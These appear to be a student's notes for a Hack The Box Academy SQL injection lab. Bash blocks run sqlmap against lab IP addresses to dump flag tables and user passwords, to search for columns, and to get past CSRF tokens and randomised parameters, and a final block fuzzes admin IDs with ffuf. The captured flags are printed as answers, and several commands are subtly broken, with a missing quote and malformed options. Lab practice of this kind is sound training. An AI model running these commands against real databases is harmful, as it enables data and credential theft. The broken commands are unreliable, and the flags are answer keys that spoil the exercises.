```bash
# What's the contents of table flag2? (Case #2)
sqlmap  --batch --dump -T flag2 --forms --crawl=2
# HTB{700_much_c0n6r475_0n_p057_r3qu357}

# What's the contents of table flag3 (Case#3)
sqlmap -u 94.237.49.212:33817/case2.php --cookie='id=1*' --dump --batch -T flag3 --level=5 --risk=3
# HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475}

# What's the contents of table flag4 (Case #4)
sqlmap -r req.txt-u 94.237.49.212:33817/case2.php/?id=1
# HTB{j450n_v00rh335_53nd5_6r475}
```

```bash
# What's the contents of table flag1 in testdb database (Case #1)
sqlmap -u 94.237.50.13:51001/case1.php/ -D testdb -T flag1 --batch --dump --crawl 2
```

```bash
# What's the name of the column containing "style" in it's name (Case #1)
# sqlmap -u "83.136.251.63:57001" --schema
sqlmap -u "83.136.251.63:57001" --search -C style --random-agent --tamper=space2comment

# What's the Kimberly user's password? (Case #1)
sqlmap -u 94.237.63.201:36417" --dump users --passwords crawl=2
```

```bash
# What's the contents of table flag8? (Case #8)
sqlmap -u 83.136.254.233:59619/case8.php -T flag8 --batch --dump --csrf-token="t0ken" --crawl=2 --forms --random-agent 
# HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d}

# What's the contents of table flag9? (Case #9)
sqlmap -u " 83.136.254.233:59619/case9.php/id=1&uid=4118292662" -T flag9 --batch --dump --randomize=uid --crawl=2 --random-agent
# HTB{700_much_r4nd0mn355_f0r_my_74573}

# What's the contents of table flag10? (Case #10)

# What's the contents of table flag11? (Case #11)

```

```bash
# Try to use SQLMap to read the file "/var/www/html/flag.txt".

# Use SQLMap to get an interactive OS shell on the remote host # and try to find another flag within the host.
# The flag is in a very common directory!

```

```bash
# What's the contents of the table final_flag?

``` 



```bash
# values generation 1 to 1000
for i in $(seq 1 1000); do echo $i >> ids.txt; done
```


```bash
# id value fuzzing
ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
```
